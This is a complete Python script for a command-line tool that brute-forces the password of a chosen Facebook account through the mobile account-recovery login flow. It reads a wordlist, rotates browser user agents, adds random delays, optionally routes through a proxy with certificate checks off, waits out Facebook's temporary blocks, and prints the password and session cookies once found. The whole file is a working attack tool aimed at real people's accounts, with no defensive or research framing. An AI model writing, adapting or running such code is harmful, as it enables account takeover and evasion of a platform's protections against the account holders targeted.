import datetime
import random
import argparse
import platform
import time
import requests
import re
import bs4
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import OperatingSystem, SoftwareName, Popularity


LOGIN_URL = "https://m.facebook.com/login/account_recovery/name_search/?flow=initiate_view&ls=initiate_view&c=%2Flogin%2F"

class FBLoginBruter:
    def __init__(self, email_or_phone, cooldown_time=20, sleep_variance=5, blocked_pause_time_step=3000, proxies=None, verbose=False) -> None:
        self.email_or_phone = email_or_phone
        self.proxies = proxies if proxies is not None else dict()
        self.user_agent_rotator = self._initiate_user_agent_rotator()
        self.post_data_format = ""
        self.cooldown_time = cooldown_time
        self.sleep_variance = abs(sleep_variance)
        self.blocked_pause_time_step = blocked_pause_time_step
        self.blocked = False
        self.verbose = verbose
        self.bs4_parser = "html.parser" if platform.system() == "Windows" else "lxml"
    
    def _log(self, level, msg, **kwargs):
        print(f"[{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] {level!s}: {msg!s}", **kwargs)
    
    def debug(self, msg, **kwargs):
        if self.verbose:
            self._log("DEBUG", msg, **kwargs)
    
    def info(self, msg, **kwargs):
        self._log("INFO", msg, **kwargs)
    
    def warning(self, msg, **kwargs):
        self._log("WARNING", msg, **kwargs)

    def _initiate_user_agent_rotator(self):
        software_names = (SoftwareName.FIREFOX.value, SoftwareName.CHROME.value, SoftwareName.SAFARI.value)
        operating_systems = (OperatingSystem.WINDOWS.value, OperatingSystem.MAC_OS_X.value)
        popularity = (Popularity.COMMON.value, Popularity.POPULAR.value)
        return UserAgent(software_names=software_names, operating_systems=operating_systems, popularity=popularity)
    
    def _initiate_recover_session_with_retries(self):
        c = 0
        while not self._initiate_recover_session():
            c += 1
            self.info("Could not initiate new recover session", end="\r")
            self.info(f"Sleeping for {str(self.blocked_pause_time_step*c)} seconds...", end="\r")
            time.sleep(self.blocked_pause_time_step * c)

    def _initiate_recover_session(self):
        self.ses = requests.Session()
        if len(self.proxies.items()) > 0:
            self.ses.proxies = self.proxies
            self.ses.verify = False
        user_agent = self.user_agent_rotator.get_random_user_agent()
        headers = {"User-Agent": user_agent, "Accept-Language": "de-de"}
        r = self.ses.get("https://m.facebook.com/login/identify", headers=headers)
        if not r.ok:
            return False
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        b = bs4.BeautifulSoup(r.text, self.bs4_parser)
        lsd = b.find(attrs={"name": "lsd"})["value"]
        jazoest = b.find(attrs={"name": "jazoest"})["value"]
        if not (m := re.search("\"_js_datr\".*?,.*?\"(.*?)\"", r.text)):
            self.debug("could not find _js_datr")
            return False
        datr = m.group(1)
        self.ses.cookies["_js_datr"] = datr
        data = f"accept_only_essential=true&jazoest={jazoest!s}&lsd={lsd!s}"
        r = self.ses.post("https://m.facebook.com/cookie/consent/", headers=headers, data=data)
        if not r.ok:
            return False
        del self.ses.cookies["_js_datr"]
        data = f"lsd={lsd!s}&jazoest={jazoest!s}&email={requests.utils.quote(self.email_or_phone)}&did_submit=Suchen"
        r = self.ses.post("https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0", headers=headers, data=data)
        if not r.ok:
            return False
        data = f"lsd={lsd!s}&jazoest={jazoest!s}&recover_method=password_login&reset_action=Weiter"
        r = self.ses.post("https://m.facebook.com/ajax/recover/initiate/?c=%2Flogin%2F&sr=0", headers=headers, data=data)
        if not r.ok:
            return False
        if not (m := re.search("cuid=(.*?)&", r.url)):
            self.debug("could not find cuid")
            return False
        cuid = m.group(1)
        self.post_data_format = f"lsd={lsd!s}&jazoest={jazoest!s}&cuid={cuid}&flow=initiate_view&pass={{password}}"
        return True
    
    def _try_pass(self, password):
        headers = {"User-Agent": self.user_agent_rotator.get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded"}
        r = self.ses.post(LOGIN_URL, self.post_data_format.format(password=password), headers=headers, allow_redirects=False)
        correct_password = r.status_code == 302 and "c_user" in r.cookies
        return correct_password, r
    
    def try_pass(self, password):
        correct_password, r = self._try_pass(password)
        while self._is_request_blocked(r):
            self._set_blocked()
            self._initiate_recover_session_with_retries()
            correct_password, r = self._try_pass(password)
        self._set_unblocked()
        return correct_password, r
    
    def _set_blocked(self):
        if not self.blocked:
            self.warning("We are blocked!")
            self.blocked = True
    
    def _set_unblocked(self):
        if self.blocked:
            self.info("We are unblocked :) Continue...")
            self.blocked = False

    def _is_request_blocked(self, r):
        return r.status_code == 200 and "Du wurdest vorübergehend blockiert" in r.text

    def _print_debug_request(self, password, idx, r):
        self.debug(f"[{password!s}][{idx!s}] {r.status_code} {str(r.cookies)} {r.headers.get('Location', '<Location header not found>')}")
    
    def _estimate_time_for_wordlist_length(self, length):
        seconds_per_pass = self.cooldown_time + 2
        initiate_recover_session_after = 350
        initiate_recover_session_time = 30 * 60
        return round(((seconds_per_pass * length) + ((length / initiate_recover_session_after)*initiate_recover_session_time)) / 60 / 60, 2)
    
    def _cooldown(self):
        min_cooldown_time = max(0, self.cooldown_time - self.sleep_variance)
        max_cooldown_time = self.cooldown_time + self.sleep_variance
        time.sleep(random.randint(min_cooldown_time, max_cooldown_time))

    def brute(self, passwords):
        self.info("Starting Login brute force attack...")
        self.info(f"Estimated Time to complete wordlist: {self._estimate_time_for_wordlist_length(len(passwords))!s} hours")
        self.info("\n")
        self._initiate_recover_session_with_retries()
        for idx, password in enumerate(filter(lambda p:p, passwords)):
            self.info(f"{idx!s}/{len(passwords)!s}", end="\r")
            correct_password, r = self.try_pass(password)
            if len(r.cookies) > 0:
                self.info(f"[{idx!s}] Cookies: {str(r.cookies)}")
            if idx % 10 == 0:
                self._print_debug_request(password, idx, r)
            if correct_password:
                self.info(f"Found password: {password!s}", flush=True)
                self.info("Cookies:")
                for k,v in r.cookies.items():
                    self.info(f"{k!s}: {v!s}")
                return True
            self._cooldown()
        return False

def main():
    parser = argparse.ArgumentParser(description="Brute force Facebook login.")
    parser.add_argument("email_or_phone", type=str, help="Email-Address or phone number of the Account to login.")
    parser.add_argument("wordlist", type=argparse.FileType("r"), help="Filepath of the wordlist to use.")
    parser.add_argument("--offset", "-o", type=int, default=0, help="Wordlist offset.")
    parser.add_argument("--cooldown-time", type=int, default=20, help="Time in seconds to sleep between every login attempt.")
    parser.add_argument("--sleep-variance", type=int, default=5, help="Time in seconds the sleep between every login attempt will vary randomly.")
    parser.add_argument("--blocking-pause", type=int, default=3000, help="Time in seconds to wait after we are blocked.")
    parser.add_argument("--proxy", "-p", type=str, help="Proxy to use for all requests.")
    parser.add_argument("--verbose", "-v", action="store_true", default=False, help="Enable verbose mode.")
    args = parser.parse_args()

    proxies = dict()
    if args.proxy:
        proxies = {"http": f"http://{args.proxy}", "https": f"https://{args.proxy}"}

    bruter = FBLoginBruter(args.email_or_phone, args.cooldown_time, args.sleep_variance, args.blocking_pause, proxies, args.verbose)
    if not bruter.brute(args.wordlist.read().splitlines()[args.offset:]):
        print("Password not found :(")

if __name__ == "__main__":
    main()
